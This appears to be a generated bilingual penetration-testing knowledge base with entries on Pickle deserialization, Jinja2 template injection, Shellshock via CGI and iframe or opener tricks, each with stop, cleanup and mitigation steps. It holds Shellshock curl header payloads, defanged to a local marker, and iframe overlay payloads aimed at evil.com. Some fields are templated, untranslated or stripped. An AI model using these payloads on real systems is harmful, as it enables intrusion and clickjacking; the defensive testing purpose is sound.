title.zh: 迁移到安全数据格式
title.en: Migrate to a safe data format

description.zh: 实施“不对不可信数据使用 Pickle，改用 JSON 等数据格式；必须兼容时验证签名、隔离加载进程、限制权限并淘汰旧序列化令牌”并重放合法对象、未许可类型和历史令牌，确认数据兼容且对象代码不再加载。
description.en: Apply do not use Pickle for untrusted data; use data-only formats such as JSON, or verify signatures, isolate the loader, reduce privileges, and retire legacy serialized tokens, replay valid objects, unapproved types, and legacy tokens, and confirm data compatibility without loading object code.

overview.zh: Python Pickle Reduce 指令流检查Pickle 虚拟机是否解析攻击者控制的 GLOBAL 与 REDUCE 指令并调用进程执行函数。成立前提为：服务对 Cookie、缓存、消息队列或上传内容调用 pickle.loads，且反序列化数据缺少可信来源和完整性保护。反序列化风险必须通过隔离工作进程产生固定无害标记，并可从反序列化调用栈、审计日志和输入对象字节定位到同一次加载进行确认；仅识别到流头、类名或标签，不足以证明对象图已被加载或产生副作用。
overview.en: Python Pickle Reduce Opcode Streams checks whether the Pickle virtual machine interprets attacker-controlled GLOBAL and REDUCE opcodes and invokes process-execution functions. It applies when the service calls pickle.loads on cookies, caches, queues, or uploads without trusted provenance and integrity protection. Deserialization risk requires an isolated worker produces a fixed harmless marker that correlates with the deserialization stack, audit log, and exact input bytes; a stream header, class name, or tag alone does not prove object loading or side effects.

vulnerability.zh: 根因是服务对 Cookie、缓存、消息队列或上传内容调用 pickle.loads，且反序列化数据缺少可信来源和完整性保护，不可信数据因此可能触发“Pickle 虚拟机是否解析攻击者控制的 GLOBAL 与 REDUCE 指令并调用进程执行函数”。真实影响由加载 API、允许类型、依赖版本、对象生命周期和服务权限共同决定，必须区分格式识别、对象实例化、gadget 触发与最终副作用四个阶段。
vulnerability.en: The root cause is the service calls pickle.loads on cookies, caches, queues, or uploads without trusted provenance and integrity protection, allowing whether the Pickle virtual machine interprets attacker-controlled GLOBAL and REDUCE opcodes and invokes process-execution functions. Impact depends on the loader API, allowed types, dependency versions, object lifecycle, and service privileges, so format recognition, object construction, gadget triggering, and final side effects must remain separate.

exploitation.zh: 在一次性进程中先加载正常业务对象，再用仅写入临时标记的等价 reduce 对象替换原命令，比较反序列化前后的进程行为。在一次性 worker 中先验证正常对象基线，再将危险动作替换为固定临时标记；逐个格式或类加载并保存原始字节、解析日志和进程状态，不读取真实秘密、不访问外部网络。
exploitation.en: load a normal business object in a disposable process, then replace the original command with an equivalent reduce object that only writes a temporary marker and compare process behavior. Establish a normal-object baseline in a disposable worker, replace dangerous behavior with a fixed temporary marker, and load one format or class at a time while preserving bytes, parser logs, and process state without real secrets or external network access.

mitigation.zh: 不对不可信数据使用 Pickle，改用 JSON 等数据格式；必须兼容时验证签名、隔离加载进程、限制权限并淘汰旧序列化令牌。完成迁移后同时重放合法数据对象、类型越界对象和历史令牌，确认业务数据仍可读取，而语言对象、函数源码和未许可类均被稳定拒绝。
mitigation.en: do not use Pickle for untrusted data; use data-only formats such as JSON, or verify signatures, isolate the loader, reduce privileges, and retire legacy serialized tokens. After migration, replay valid data objects, out-of-schema types, and historical tokens to preserve business data while reliably rejecting language objects, function source, and unapproved classes.

name.zh: Jinja2 SSTI 进程执行链

description.zh: 覆盖 Flask globals、Python 子类枚举和 builtins 导入的 Jinja2 表达式，用于确认模板注入是否跨越沙箱并到达进程执行。
description.en: Covers Flask globals, Python subclass enumeration, and builtins imports in Jinja2 expressions to test whether template injection escapes sandboxing and reaches process execution.

subCategory.zh: Jinja2 对象图到进程执行
subCategory.en: Jinja2 Object Graph to Process Execution

prerequisites.zh: 已用无害算术确认“Jinja2 SSTI 进程执行链”存在模板源码求值，并记录 Jinja2/Flask 版本、沙箱和可见对象，满足：不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程。
prerequisites.en: Harmless arithmetic confirms template-source evaluation for Jinja2 SSTI Process Execution Chains; Jinja2 or Flask versions, sandboxing, and exposed objects are recorded, and an untrusted string is compiled as Jinja2 template source, sandboxing is absent or attribute policy is bypassable, and the process identity can create child processes.

prerequisites.zh: 一次性模板 worker 可记录属性拒绝、渲染、子进程审计和模板表达式解析路径、渲染日志、子进程固定标记与同一请求 ID 完整关联。
prerequisites.en: A disposable template worker can record denied attributes, rendering, child-process auditing, and the template resolution path, render log, fixed child-process marker, and request identifier fully correlate.

title.zh: SSTI Reverse Shell - Jinja2 (d4t4s3c)

description.zh: SSTI Reverse Shell - Jinja2 (d4t4s3c)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: SSTI reverse shell - Jinja2 (d4t4s3c) contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性要求模板源码逐步到达 globals/类型对象，再到进程 API，并取得模板表达式解析路径、渲染日志、子进程固定标记与同一请求 ID 完整关联。算术成立、对象名回显、subclasses 索引报错或反连字符串被渲染均是假阳性，不能证明“模板上下文是否暴露 request、应用 globals、Python 类型对象或 builtins，并允许解析链调用 os 或 subprocess”。
analysis.en: 阳性要求模板源码逐步到达 globals/类型对象，再到进程 API，并取得模板表达式解析路径、渲染日志、子进程固定标记与同一请求 ID 完整关联。算术成立、对象名回显、subclasses 索引报错或反连字符串被渲染均是假阳性，不能证明“模板上下文是否暴露 request、应用 globals、Python 类型对象或 builtins，并允许解析链调用 os 或 subprocess”。

opsecTips.zh: Jinja2 SSTI 进程执行链停止条件：所有反连动作替换为固定 stdout 标记；worker 创建非预期进程、联网或访问真实文件时立即销毁并停止。 本条重点观察“模板上下文是否暴露 request、应用 globals、Python 类型对象或 builtins，并允许解析链调用 os 或 subprocess”。
opsecTips.en: Jinja2 SSTI Process Execution Chains stop condition: Replace reverse behavior with a fixed stdout marker; destroy the worker and stop on unexpected processes, network, or real-file access. The entry-specific focus is whether template context exposes request, application globals, Python type objects, or builtins and permits a resolution chain to os or subprocess.

opsecTips.zh: Jinja2 SSTI 进程执行链清理条件：结束后删除测试模板和缓存、轮换临时会话、重建 worker，并确认 globals、调试器和测试路由未残留。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Jinja2 SSTI Process Execution Chains cleanup condition: Delete test templates and caches, rotate temporary sessions, rebuild the worker, and verify globals, debuggers, and test routes are removed. Recheck that no triggerable state remains for this technique.

title.zh: 确认 Jinja2 模板源码可控

description.zh: 使用算术和固定字符串区分模板源码注入与普通变量渲染，并核对“不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程”。
description.en: Use arithmetic and fixed strings to distinguish template-source injection from ordinary variable rendering and confirm that an untrusted string is compiled as Jinja2 template source, sandboxing is absent or attribute policy is bypassable, and the process identity can create child processes.

title.zh: 枚举允许的对象边界

description.zh: 逐步检查 request、globals、类型属性与沙箱拒绝记录，采用“模板表达式解析路径、渲染日志、子进程固定标记与同一请求 ID 完整关联”作为跨入进程边界的证据。
description.en: Inspect request, globals, type attributes, and sandbox denials incrementally, using the template resolution path, render log, fixed child-process marker, and request identifier fully correlate as evidence of process-boundary crossing.

title.zh: 无害重放“Jinja2 SSTI 进程执行链”对象链
title.en: Replay the Jinja2 SSTI Process Execution Chains chain harmlessly

description.zh: 测试步骤为：先用算术与安全属性访问建立 SSTI 基线，再将反连命令替换为固定 stdout 标记，逐条确认 globals、subclasses 和 builtins 三类对象链。每条反连命令在运行前替换为固定 stdout 标记。
description.en: establish SSTI with arithmetic and safe attribute access, replace reverse commands with a fixed stdout marker, and test globals, subclasses, and builtins object chains separately. Replace every reverse command with a fixed stdout marker before runtime.

title.zh: 固定模板并隔离 worker

description.zh: 实施“禁止将用户内容作为模板源码，使用固定模板和数据参数；启用并收紧沙箱属性策略，以低权限运行并阻止模板进程创建子进程”后重放算术、合法变量和原对象链，确认渲染保留且对象遍历被拒绝。
description.en: Apply never compile user content as template source, use fixed templates with data parameters, enforce strict sandbox attribute policy, run with least privilege, and prevent template workers from spawning processes, then replay arithmetic, valid variables, and original chains to preserve rendering while denying object traversal.

overview.zh: Jinja2 SSTI 进程执行链验证模板上下文是否暴露 request、应用 globals、Python 类型对象或 builtins，并允许解析链调用 os 或 subprocess。它要求不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程。成功证据为模板表达式解析路径、渲染日志、子进程固定标记与同一请求 ID 完整关联；算术表达式成立只能证明模板求值，外连命令文本出现也不能证明已经越过对象与进程边界。
overview.en: Jinja2 SSTI Process Execution Chains tests whether template context exposes request, application globals, Python type objects, or builtins and permits a resolution chain to os or subprocess. It requires an untrusted string is compiled as Jinja2 template source, sandboxing is absent or attribute policy is bypassable, and the process identity can create child processes. Success requires the template resolution path, render log, fixed child-process marker, and request identifier fully correlate; arithmetic proves template evaluation only, and reflected reverse-command text does not prove process execution.

vulnerability.zh: 根因是不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程，Jinja2 对象解析因此可能到达“模板上下文是否暴露 request、应用 globals、Python 类型对象或 builtins，并允许解析链调用 os 或 subprocess”。影响取决于模板来源、沙箱属性策略、可见 globals、Python 版本与 worker 权限，需要分阶段证明表达式、对象访问和进程调用。
vulnerability.en: The root cause is an untrusted string is compiled as Jinja2 template source, sandboxing is absent or attribute policy is bypassable, and the process identity can create child processes, allowing Jinja2 resolution toward whether template context exposes request, application globals, Python type objects, or builtins and permits a resolution chain to os or subprocess. Impact depends on template provenance, sandbox attribute policy, exposed globals, Python version, and worker privilege, so expression, object access, and process invocation require separate proof.

exploitation.zh: 先用算术与安全属性访问建立 SSTI 基线，再将反连命令替换为固定 stdout 标记，逐条确认 globals、subclasses 和 builtins 三类对象链。每次只验证一条对象链，将所有反连动作改为固定 stdout 标记，记录模板源码、渲染结果、属性访问拒绝和子进程日志，并在取得最小证据后停止。
exploitation.en: establish SSTI with arithmetic and safe attribute access, replace reverse commands with a fixed stdout marker, and test globals, subclasses, and builtins object chains separately. Validate one object chain per run, replace all reverse behavior with fixed stdout markers, retain template source, render result, denied attributes, and child logs, and stop after minimal proof.

mitigation.zh: 禁止将用户内容作为模板源码，使用固定模板和数据参数；启用并收紧沙箱属性策略，以低权限运行并阻止模板进程创建子进程。回归使用固定模板、合法数据、算术探针和原对象链，确认业务渲染保留，而不可信内容始终作为数据处理且无法访问 globals、类型对象或进程 API。
mitigation.en: never compile user content as template source, use fixed templates with data parameters, enforce strict sandbox attribute policy, run with least privilege, and prevent template workers from spawning processes. Regress fixed templates, valid data, arithmetic probes, and original object chains to preserve rendering while untrusted content remains data and cannot reach globals, type objects, or process APIs.

name.zh: Shellshock CGI 环境变量命令执行

description.zh: 通过 curl 将 Shellshock 函数定义和固定标记放入 Cookie 或 User-Agent，验证 CGI 是否把请求头映射为环境变量并交给存在缺陷的 Bash 解析；curl 只是投递器，审核后的五行仅访问本机隔离实例。
description.en: Uses curl to place a Shellshock function definition and fixed marker in Cookie or User-Agent, testing whether CGI maps the header into an environment variable parsed by vulnerable Bash; curl is only the delivery client, and all five reviewed requests target a local isolated instance.

prerequisites.zh: 目标是明确授权的隔离 CGI 实例，请求头会映射为环境变量，CGI 脚本或子进程实际调用 Bash，并且 Bash 版本与供应商补丁状态可以核验。
prerequisites.en: The target is an explicitly authorized isolated CGI instance where headers become environment variables, a CGI script or child actually invokes Bash, and the Bash version and vendor patch status are verifiable.

prerequisites.zh: command override 已将反连尾随命令替换为本地一次性 printf 标记，并可关联 curl 详细请求、CGI 环境、子进程日志和已修复实例对照。
prerequisites.en: The command override replaces the reverse-shell trailing command with a local one-time printf marker, and verbose curl output, CGI environment, child-process logs, and a patched control can be correlated.

title.zh: Shellshock via curl (d4t4s3c)

execution.command:
curl --include --max-time 5 -H 'Cookie: () { :;}; printf "SHELLSHOCK_TEST_MARKER"' http://127.0.0.1:8080/cgi-bin/test.sh
curl --include --max-time 5 -H 'User-Agent: () { :; }; printf "SHELLSHOCK_TEST_MARKER"' http://127.0.0.1:8080/cgi-bin/evil.sh
curl --include --max-time 5 -H 'User-Agent: () { :; }; printf "SHELLSHOCK_TEST_MARKER"' http://127.0.0.1:8080/cgi-bin/evil.cgi
curl --include --max-time 5 -H 'User-Agent: () { :; }; echo; printf "SHELLSHOCK_TEST_MARKER"' http://127.0.0.1:8080/cgi-bin/evil.sh
curl --include --max-time 5 -H 'User-Agent: () { :; }; echo; echo; printf "SHELLSHOCK_TEST_MARKER"' http://127.0.0.1:8080/cgi-bin/evil.sh

description.zh: Shellshock via curl (d4t4s3c)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Shellshock via curl (d4t4s3c) contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性必须证明受影响 Bash 从该请求对应的 CGI 环境变量恢复函数时执行了固定尾随标记，并由相同请求 ID 的 Header、环境快照、CGI 子进程日志和标记输出共同佐证。仅有 CGI 200/500、函数定义被回显或记录、Bash 版本字符串、curl 请求成功、未关联的网络连接，或在已获得 Shell 中手工执行命令，均不能证明 Shellshock RCE。
analysis.en: A positive requires proof that affected Bash executed the fixed trailing marker while restoring a function from the CGI environment for that request, corroborated by the same request identifier, header, environment snapshot, CGI child log, and marker output. CGI 200 or 500, reflected or logged function syntax, a Bash version string, a successful curl request, an uncorrelated connection, or manual command execution in an existing shell does not prove Shellshock RCE.

opsecTips.zh: Shellshock CGI 环境变量命令执行停止条件：原五行反连命令只允许离线保存，不得直接执行；复验仅使用本地固定 marker。出现外连、交互 Shell、文件写入、真实数据返回、进程异常或服务不稳定时立即停止并记录请求 ID。
opsecTips.en: Shellshock CGI Environment-Variable Command Execution stop condition: retain the five reverse-shell lines offline only and never replay them directly; validation uses a local fixed marker. Stop and record the request identifier on egress, an interactive shell, file writes, real-data return, process anomalies, or service instability.

opsecTips.zh: Shellshock CGI 环境变量命令执行清理条件：删除固定 marker 和测试 CGI，清理含测试 Header 的缓存与临时日志，关闭任何本地监听器，恢复 CGI 配置并销毁旧 Bash 实例；最后确认没有遗留子进程或环境变量。
opsecTips.en: Shellshock CGI Environment-Variable Command Execution cleanup condition: remove fixed markers and test CGI files, clear caches and temporary logs containing test headers, close local listeners, restore CGI configuration, and destroy the legacy Bash instance; finally confirm no child process or environment variable remains.

title.zh: 确认 CGI 到 Bash 的 Shellshock 入口

description.zh: 定位接收 Cookie 或 User-Agent 的 CGI 路径，确认请求头被映射为环境变量，记录实际启动的 Shell、Bash 版本、补丁包和 CGI 服务身份。
description.en: Locate the CGI path receiving Cookie or User-Agent, confirm header-to-environment mapping, and record the invoked shell, Bash version, vendor patch, and CGI service identity.

title.zh: 建立已修复与受影响 Bash 对照
title.en: Establish patched and affected Bash controls

description.zh: 用普通 Header 记录正常 CGI 行为，再在隔离实例分别对已修复和受影响 Bash 使用相同一次性 printf 标记，保存请求 ID、环境变量和子进程日志。
description.en: Record normal CGI behavior with an ordinary header, then use the same one-time printf marker against patched and affected Bash in isolation, retaining request identifiers, environment variables, and child-process logs.

title.zh: 逐行验证 Shellshock Header 变体
title.en: Validate Shellshock header variants line by line

description.zh: 以下五行已由 command override 去除反连 Shell，仅保留本地固定 marker、Header 分隔形式和 CGI 路径差异；逐条执行并关联请求 ID、CGI 环境和 Bash 子进程日志。
description.en: The command override removes reverse shells from all five lines and retains only a local fixed marker plus header-separator and CGI-path variants; run each separately and correlate the request identifier, CGI environment, and Bash child-process log.

attackChain.payload:
curl --include --max-time 5 -H 'Cookie: () { :;}; printf "SHELLSHOCK_TEST_MARKER"' http://127.0.0.1:8080/cgi-bin/test.sh
curl --include --max-time 5 -H 'User-Agent: () { :; }; printf "SHELLSHOCK_TEST_MARKER"' http://127.0.0.1:8080/cgi-bin/evil.sh
curl --include --max-time 5 -H 'User-Agent: () { :; }; printf "SHELLSHOCK_TEST_MARKER"' http://127.0.0.1:8080/cgi-bin/evil.cgi
curl --include --max-time 5 -H 'User-Agent: () { :; }; echo; printf "SHELLSHOCK_TEST_MARKER"' http://127.0.0.1:8080/cgi-bin/evil.sh
curl --include --max-time 5 -H 'User-Agent: () { :; }; echo; echo; printf "SHELLSHOCK_TEST_MARKER"' http://127.0.0.1:8080/cgi-bin/evil.sh

title.zh: 修复 Bash 与 CGI 边界并回归
title.en: Remediate and regress the Bash and CGI boundary

description.zh: 安装供应商 Bash 修复、重启相关进程并移除不必要 CGI 后，从同一入口重放普通 Header 和固定标记，确认业务响应保留、尾随文本不执行且无异常子 Shell。
description.en: After installing the vendor Bash fix, restarting affected processes, and removing unnecessary CGI, replay the ordinary header and fixed marker through the same entry to preserve business responses while trailing text does not execute and no unexpected child shell appears.

overview.zh: Shellshock CGI 环境变量命令执行用于验证 CVE-2014-6271 的完整数据流：HTTP Cookie 或 User-Agent 经 CGI 转换为环境变量，CGI 脚本或其子进程再启动存在缺陷的 Bash，Bash 导入函数定义时错误执行尾随文本。适用前提是明确授权的隔离旧版 Bash CGI 实例、可核验的 Bash 补丁状态、可观察的 CGI 子进程日志，以及替代反连命令的无副作用固定标记。只有请求头、CGI 进程、Bash 版本和固定输出属于同一次请求时才可判定。
overview.en: Shellshock CGI Environment-Variable Command Execution validates the complete CVE-2014-6271 flow: an HTTP Cookie or User-Agent becomes a CGI environment variable, a CGI script or child launches vulnerable Bash, and Bash incorrectly executes text trailing an imported function definition. It requires an explicitly authorized isolated legacy Bash CGI instance, verifiable patch status, observable CGI child-process logs, and a side-effect-free fixed marker replacing reverse-shell commands. A finding requires the header, CGI process, Bash version, and fixed output to correlate to one request.

vulnerability.zh: 漏洞根因是受影响 Bash 在从环境变量恢复函数时没有在函数体结束处停止解析，导致函数定义后的命令也被执行。CGI 服务器通常把请求头转换为 HTTP_COOKIE、HTTP_USER_AGENT 等环境变量；只有后续组件确实调用受影响 Bash 时，这条输入链才成立。CGI 可访问、服务器使用其他 Shell、Bash 已修复或请求头只被日志记录时，不构成该 RCE。
vulnerability.en: The flaw exists because affected Bash versions fail to stop parsing after restoring a function from an environment variable and execute commands following the function body. CGI servers commonly map headers to variables such as HTTP_COOKIE and HTTP_USER_AGENT, but the chain exists only when a downstream component invokes affected Bash. A reachable CGI, a different shell, patched Bash, or header logging without Bash parsing does not establish this RCE.

exploitation.zh: 原始五行均会尝试建立交互式反连，审核时已通过 command override 保留 Cookie/User-Agent、函数定义和 CGI 路径结构，并把尾随部分替换为本地 printf 固定标记、127.0.0.1 隔离目标和五秒超时。逐个 Header 和 CGI 路径低频验证，并与已修复 Bash 实例对照；任何外连、Shell、写文件或真实数据读取都不是本条所需证据。
exploitation.en: All five source lines attempted interactive reverse connections. The reviewed command override preserves the Cookie or User-Agent, function definition, and CGI path structure while replacing the tail with a local printf marker, a 127.0.0.1 isolated target, and a five-second timeout. Test one header and CGI path at low rate against affected and patched Bash controls; no egress, shell, file write, or real-data read is required evidence.

mitigation.zh: 升级 Bash 到供应商已修复版本并重启所有长期运行进程，移除不必要的 CGI，避免 CGI 脚本或其子进程调用 Bash，并限制传入解释器的环境变量。WAF 对函数定义头的拦截只能作为纵深防御。修复后以同一固定标记重放 Header，确认 CGI 正常业务仍工作，而已修复实例不执行尾随文本且进程日志中没有异常子 Shell。
mitigation.en: Upgrade Bash to a vendor-fixed build and restart long-lived processes, remove unnecessary CGI, avoid Bash invocation from CGI scripts or children, and constrain environment variables passed to interpreters. Blocking function-definition headers at a WAF is defense in depth only. Replay the same fixed marker after remediation to preserve normal CGI behavior while proving trailing text is not executed and no unexpected child shell appears.

name.zh: target=_blank 的 opener 隔离对照

description.zh: 比较 rel=opener、noopener、noreferrer 与无相关关键字时新标签页是否保留 opener，并以现代浏览器隐式 noopener 为基线。
description.en: Compares rel=opener, noopener, noreferrer, and unrelated link types for opener retention in a new tab, using modern implicit noopener behavior as the baseline.

subCategory.zh: 新浏览上下文 opener 策略

prerequisites.zh: 使用支持 target=_blank 隐式 noopener 的当前浏览器，并记录版本、COOP 响应头与扩展策略。
prerequisites.en: Use a current browser that implements implicit noopener for target=_blank and record the version, COOP headers, and extension policies.

prerequisites.zh: 测试链接和目标页均由授权域控制，目标页只读取 `window.opener === null` 并返回固定布尔标记。
prerequisites.en: Both link and destination pages are controlled, and the destination only reports a fixed Boolean marker for `window.opener === null`.

title.zh: target="_blank" ?rel="noopener"

execution.command: Click Click (safe) Click Click Click Click

description.zh: target="_blank" ?rel="noopener"包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: target="_blank" ?rel="noopener" contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 行 0 的 `rel=opener` 是现代浏览器中的显式 opt-in 候选；行 1、4 使用 noopener，行 5 的 noreferrer 蕴含 noopener；行 2、3 虽无 noopener，但现代 `_blank` 仍隐式隔离，只有旧浏览器可作为兼容性例外。新标签打开成功不是 reverse tabnabbing 阳性。
analysis.en: Line 0 with `rel=opener` is the explicit modern opt-in candidate; lines 1 and 4 use noopener, and noreferrer on line 5 implies noopener. Lines 2 and 3 omit it but modern `_blank` still isolates implicitly, with legacy browsers only as compatibility exceptions. A successfully opened tab is not a reverse-tabnabbing finding.

opsecTips.zh: 目标页首次确认 opener 非空后停止，只执行跳转到本地无害标记页，不展示登录表单或采集导航数据。
opsecTips.en: Stop after the destination first confirms a non-null opener and navigate only to a local harmless marker page; do not display login forms or collect navigation data.

opsecTips.zh: 关闭所有测试标签，清理站点数据与 service worker，恢复 COOP/响应头并删除目标页的临时 opener 日志。
opsecTips.en: Close all test tabs, clear site data and service workers, restore COOP and response headers, and delete temporary opener logs on the destination.

title.zh: 确认新浏览上下文 opener 策略前置条件

description.zh: 六行是 opener 正负对照，不是 XSS；现代 `_blank` 在未显式 `rel=opener` 时默认按 noopener 处理。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。
description.en: The six lines are opener positive and negative controls, not XSS; modern `_blank` behaves as noopener unless `rel=opener` explicitly opts in. Record normal behavior, component versions, security headers, message schema, and relevant logs.

title.zh: 执行受控新浏览上下文 opener 策略对照
title.en: Run a controlled New-Context Opener Policy comparison

description.zh: 逐行打开受控目标，记录 opener 是否为 null；将 rel=opener 作为候选阳性，noopener/noreferrer 与无关 rel 作为现代负对照。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。
description.en: Open the controlled target for each line and record whether opener is null, using rel=opener as the positive candidate and noopener, noreferrer, or unrelated rel values as modern negative controls. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker.

attackChain.payload: Click Click (safe) Click Click Click Click

title.zh: 核对新浏览上下文 opener 策略阳性边界
title.en: Verify New-Context Opener Policy positive boundaries

description.zh: 阳性必须由目标页直接证明 opener 非空且能执行允许的受控导航；仅打开新标签、看到 Referer 或链接可点击都不够。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。
description.en: 阳性必须由目标页直接证明 opener 非空且能执行允许的受控导航；仅打开新标签、看到 Referer 或链接可点击都不够。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。

title.zh: 修复并回归新浏览上下文 opener 策略
title.en: Remediate and regress New-Context Opener Policy

description.zh: 不需要 opener 时显式使用 noopener/noreferrer，并通过 COOP 隔离浏览上下文；仅在受信目标确需通信时使用 opener 与 postMessage。 重放正常、阳性和阴性样例并完成测试数据清理。
description.en: Use noopener or noreferrer when opener access is unnecessary and isolate browsing contexts with COOP; opt into opener only for trusted destinations using post Message. Replay normal, positive, and negative cases and complete test-data cleanup.

overview.zh: target=_blank 的 opener 隔离对照聚焦六行是 opener 正负对照，不是 XSS；现代 `_blank` 在未显式 `rel=opener` 时默认按 noopener 处理。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。
overview.en: Opener Isolation Controls for target=_blank focuses on this boundary: The six lines are opener positive and negative controls, not XSS; modern `_blank` behaves as noopener unless `rel=opener` explicitly opts in. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline.

vulnerability.zh: 风险来自新页面持有 opener 引用并能在允许范围内影响原窗口，而不是链接 HTML 本身执行脚本。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。
vulnerability.en: Risk comes from a new page retaining an opener reference and influencing the original window within permitted capabilities, not from the link HTML executing script. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance.

exploitation.zh: 逐行打开受控目标，记录 opener 是否为 null；将 rel=opener 作为候选阳性，noopener/noreferrer 与无关 rel 作为现代负对照。 阳性必须由目标页直接证明 opener 非空且能执行允许的受控导航；仅打开新标签、看到 Referer 或链接可点击都不够。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。
exploitation.en: 逐行打开受控目标，记录 opener 是否为 null；将 rel=opener 作为候选阳性，noopener/noreferrer 与无关 rel 作为现代负对照。 阳性必须由目标页直接证明 opener 非空且能执行允许的受控导航；仅打开新标签、看到 Referer 或链接可点击都不够。 关联浏览器 Dev Tools、握手/消息日志和后端审计，形成明确阳性与阴性对照。

mitigation.zh: 不需要 opener 时显式使用 noopener/noreferrer，并通过 COOP 隔离浏览上下文；仅在受信目标确需通信时使用 opener 与 postMessage。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。
mitigation.en: Use noopener or noreferrer when opener access is unnecessary and isolate browsing contexts with COOP; opt into opener only for trusted destinations using post Message. Replay the same controls after remediation; valid browser or Web Socket behavior should remain while unauthorized capability or parsing differences disappear.

name.zh: 隐藏 iframe 与透明覆盖层探针
name.en: Hidden Iframe and Transparent Overlay Probes

description.zh: 区分不可交互的隐藏/零尺寸 iframe 与可覆盖页面的透明 iframe，验证嵌入内容和点击转移，而非错误称为 Tabnabbing。
description.en: Distinguishes noninteractive hidden or zero-size iframes from a transparent page-covering iframe to test embedding and click redirection rather than mislabeling it as tabnabbing.

prerequisites.zh: 页面允许插入 iframe，且 CSP frame-src、目标 X-Frame-Options/CSP frame-ancestors 与 sandbox 状态已记录。
prerequisites.en: The page permits iframe insertion and CSP frame-src, destination X-Frame-Options or frame-ancestors, and sandbox state are recorded.

prerequisites.zh: 目标 iframe 指向受控页面，页面仅记录是否加载及一次测试点击，不包含真实认证或敏感操作。
prerequisites.en: The iframe targets a controlled page that records only load state and one test click, with no real authentication or sensitive action.

title.zh: tabnabbing via iframe

description.zh: tabnabbing via iframe包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: tabnabbing via iframe contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 行 0 `display:none` 和行 1 零尺寸不会提供可点击表面，只能证明资源加载；行 2 的透明绝对定位覆盖需同时满足层级、尺寸与 pointer hit-testing 才可能是点击劫持。三者均没有 `_blank` 或 opener，因此不能报告 Tabnabbing。
analysis.en: Line 0 with display:none and line 1 at zero size provide no clickable surface and prove only loading. The transparent absolute overlay on line 2 is clickjacking only if stacking, dimensions, and pointer hit testing align. None has `_blank` or an opener, so none supports a tabnabbing report.

opsecTips.zh: 透明覆盖首次接收到测试点击后停止，不覆盖真实支付、管理或登录控件，也不诱导其他用户操作。
opsecTips.en: Stop after the transparent overlay receives one test click; do not cover real payment, administration, or login controls or involve other users.

opsecTips.zh: 删除测试 iframe 与 CSS，清理受控目标的点击日志，关闭页面并恢复 CSP/frame-ancestors 配置。
opsecTips.en: Remove the test iframe and CSS, clear controlled-target click logs, close the page, and restore CSP or frame-ancestors configuration.

title.zh: 确认iframe 嵌入与透明覆盖前置条件
title.en: Confirm Iframe Embedding and Transparent Overlay prerequisites

description.zh: 前三行都不创建新标签或 opener：display:none 与零尺寸是加载负对照，透明全页 iframe 才可能形成 UI 覆盖。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。
description.en: None of the three lines creates a new tab or opener: display:none and zero size are load controls, while a transparent full-page iframe may create a UI overlay. Record normal behavior, component versions, security headers, message schema, and relevant logs.

title.zh: 执行受控iframe 嵌入与透明覆盖对照
title.en: Run a controlled Iframe Embedding and Transparent Overlay comparison

description.zh: 依次观察 iframe 是否加载、是否参与命中测试与是否接收受控点击，并比较隐藏、零尺寸和透明全屏样式。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。
description.en: Observe iframe loading, hit testing, and receipt of one controlled click for hidden, zero-size, and transparent full-page styles. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker.

attackChain.payload:
<iframe src="https://evil.com/tabnabbing" style="display:none"></iframe>
<iframe src="https://evil.com/tabnabbing" style="width:0;height:0;border:0"></iframe>
<iframe src="https://evil.com/tabnabbing" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>

title.zh: 核对iframe 嵌入与透明覆盖阳性边界
title.en: Verify Iframe Embedding and Transparent Overlay positive boundaries

description.zh: 只有第三种布局实际覆盖目标控件并把测试点击交给 iframe 才是 UI redress 阳性；后台加载或不可见 iframe 存在不等于点击劫持。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。
description.en: Only a layout that actually covers a target control and delivers the test click to the iframe is a UI-redress finding; background loading or iframe presence alone is not clickjacking. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client.

title.zh: 修复并回归iframe 嵌入与透明覆盖
title.en: Remediate and regress Iframe Embedding and Transparent Overlay

description.zh: 限制可嵌入来源，使用 frame-ancestors/X-Frame-Options，避免不受信 HTML 注入并对关键动作进行明确确认。 重放正常、阳性和阴性样例并完成测试数据清理。
description.en: Restrict embedding origins with frame-ancestors or X-Frame-Options, prevent untrusted HTML injection, and require explicit confirmation for sensitive actions. Replay normal, positive, and negative cases and complete test-data cleanup.

overview.zh: 隐藏 iframe 与透明覆盖层探针聚焦前三行都不创建新标签或 opener：display:none 与零尺寸是加载负对照，透明全页 iframe 才可能形成 UI 覆盖。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。
